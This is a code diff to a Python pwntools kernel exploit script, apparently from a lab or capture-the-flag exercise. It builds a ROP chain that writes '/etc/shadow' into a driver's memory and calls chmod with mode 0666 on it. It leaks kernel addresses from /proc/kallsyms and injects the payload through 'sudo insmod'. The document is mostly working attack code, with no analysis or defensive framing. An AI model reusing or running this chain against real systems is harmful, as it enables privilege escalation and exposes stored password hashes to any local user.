@@ -53,23 +53,23 @@ from unalignedrop.gadget_finder import gadget
 # target_binary into memory in userspace.c everything is 0x40 above where it
 # normally is. Therefore we use some addition to fix that.
 class Adjuster(object):
-    def __init__(self, offset):
+    def __init__(self, offset=0):
         '''
         Specify an offset to be used for adjustment
         '''
-        self.offset = offset
+        self.offset = int(offset)
 
     def __call__(self, addr):
         '''
         Return the addr + the offset specified on creation
         '''
-        return self.offset + addr
+        return self.offset + int(addr)
 
     def add(self, add):
-        self.offset += add
+        self.offset += int(add)
         return self.offset
 
-adjuster = Adjuster(0x00)
+adjuster = Adjuster()
 
 def chmod_addr():
     with open('/proc/kallsyms', 'rb') as i:
@@ -92,6 +92,22 @@ def leaked(start_leaker, search_for):
         leak = int(leak[-2], 16)
     return leak, leaker
 
+def write4(rop, gadget_file, adjuster, string_location, string):
+    # pop rax; ret;
+    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
+    # rop.raw(adjuster(0x2f0eb))
+    # /etc
+    rop.raw(string)
+    # pop rdi; ret;
+    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
+    # rop.raw(adjuster(0x257e9))
+    # set rdi
+    rop.raw(string_location)
+    # mov rax, (rdi)
+    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
+    # rop.raw(adjuster(0x80da3))
+    return rop
+
 def build(leak, gadget_file, sled_length):
     # Load the target binary
     with open(gadget_file, 'rb') as i:
@@ -110,58 +126,31 @@ def build(leak, gadget_file, sled_length):
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
     # We have to adjust because the gadget we have is rdi + 0x2a50
-    string_location = leak
+    string_location = int(leak)
 
-    # pop rax; ret;
-    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
-    # /etc
-    rop.raw(b'/etc')
-    # rop.raw(b'/tmp')
-    # pop rdi; ret;
-    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
-    # set rdi
-    rop.raw(adjuster(string_location))
-    # mov rax, (rdi)
-    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
-
-    # pop rax; ret;
-    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
-    # /sha
-    rop.raw(b'/sha')
-    # pop rdi; ret;
-    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
-    # set rdi
-    rop.raw(adjuster(string_location + 4))
-    # mov rax, (rdi)
-    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
-
-    # pop rax; ret;
-    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
-    # dow\x00
-    rop.raw(b'dow\x00')
-    # pop rdi; ret;
-    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
-    # set rdi
-    rop.raw(adjuster(string_location + 8))
-    # mov rax, (rdi)
-    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
+    rop = write4(rop, gadget_file, adjuster, string_location, b'/etc')
+    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'/sha')
+    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'dow\x00')
 
     # Now call chmod
 
     # pop rax; ret;
     rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
+    # rop.raw(adjuster(0x2f0eb))
     # set rax
     rop.raw(0x5a)
     # pop rdi; ret;
     rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
+    # rop.raw(adjuster(0x257e9))
     # set rdi
-    rop.raw(adjuster(string_location))
+    rop.raw(string_location)
     # pop rsi; ret;
     rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
     # set rsi
     rop.raw(0o666)
     # syscall; NULL
-    rop.raw(adjuster(gadget('syscall;', gadget_file)))
+    # rop.raw(adjuster(gadget('syscall;', gadget_file)))
+    rop.raw(0x0)
     # sys_chmod
     # rop.raw(adjuster(chmod_addr()))
 
@@ -198,7 +187,7 @@ def attack_kernel(target_binary, payload_file, sled_length):
     args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
         'exploit_length="'+str(exploit_length)+'"']
     print(args)
-    # print(process(args).recvall())
+    print(process(args).recvall())
 
 def main():
     # Set the pwntools context
